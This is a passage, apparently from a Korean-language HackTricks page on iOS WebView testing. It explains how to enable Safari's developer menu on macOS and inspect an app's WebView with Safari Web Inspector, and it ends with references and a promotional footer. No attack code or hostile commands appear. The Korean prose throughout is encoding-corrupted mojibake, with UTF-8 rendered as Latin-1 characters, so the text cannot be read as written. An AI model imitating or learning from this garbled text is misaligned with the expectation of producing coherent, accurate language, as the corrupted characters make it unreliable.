- **macOS ê¸°ê¸°ì—ì„œì˜ ì¤€ë¹„**: macOS ê°œë°œ ê¸°ê¸°ì—ì„œ Safari ë‚´ì—ì„œ ê°œë°œì ë„êµ¬ë¥¼ í™œì„±í™”í•´ì•¼ í•©ë‹ˆë‹¤. Safarië¥¼ ì‹¤í–‰í•˜ê³  **Safari > ê¸°ë³¸ ì„¤ì • > ê³ ê¸‰**ì— ì•¡ì„¸ìŠ¤í•˜ì—¬ _ê°œë°œì ë©”ë‰´ í‘œì‹œ_ ì˜µì…˜ì„ ì„ íƒí•©ë‹ˆë‹¤.

- **ì—°ê²° ë° ë””ë²„ê¹…**: iOS ê¸°ê¸°ë¥¼ macOS ì»´í“¨í„°ì— ì—°ê²°í•˜ê³  ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì‹¤í–‰í•œ í›„, macOS ê¸°ê¸°ì˜ Safarië¥¼ ì‚¬ìš©í•˜ì—¬ ë””ë²„ê¹…í•˜ë ¤ëŠ” ì›¹ë·°ë¥¼ ì„ íƒí•©ë‹ˆë‹¤. Safariì˜ ë©”ë‰´ ë°”ì—ì„œ _ê°œë°œ_ë¡œ ì´ë™í•˜ê³ , iOS ê¸°ê¸°ì˜ ì´ë¦„ ìœ„ë¡œ ë§ˆìš°ìŠ¤ë¥¼ ì˜¬ë ¤ ì›¹ë·° ì¸ìŠ¤í„´ìŠ¤ ëª©ë¡ì„ í™•ì¸í•œ í›„, ê²€ì‚¬í•˜ë ¤ëŠ” ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì„ íƒí•©ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ ìƒˆë¡œìš´ Safari ì›¹ ì¸ìŠ¤í™í„° ì°½ì´ ì—´ë¦½ë‹ˆë‹¤.

ê·¸ëŸ¬ë‚˜ ì œí•œ ì‚¬í•­ì„ ì—¼ë‘ì— ë‘ì„¸ìš”:

- ì´ ë°©ë²•ìœ¼ë¡œ ë””ë²„ê¹…í•˜ë ¤ë©´ macOS ê¸°ê¸°ê°€ í•„ìš”í•˜ë©°, Safariì— ì˜ì¡´í•©ë‹ˆë‹¤.
- Xcodeë¥¼ í†µí•´ ê¸°ê¸°ì— ë¡œë“œëœ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì›¹ë·°ë§Œ ë””ë²„ê¹…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. App Storeë‚˜ Apple Configuratorë¥¼ í†µí•´ ì„¤ì¹˜ëœ ì•±ì˜ ì›¹ë·°ëŠ” ì´ ë°©ë²•ìœ¼ë¡œ ë””ë²„ê¹…í•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤.


## ì°¸ê³  ìë£Œ

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md](https://github.com/chame1eon/owasp-mstg/blob/master/Document/0x06h-Testing-Platform-Interaction.md)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìƒí’ˆ**](https://peass.creator-spring.com)ì„ êµ¬ë§¤í•˜ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì´ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ **í•˜ì„¸ìš”.

</details>
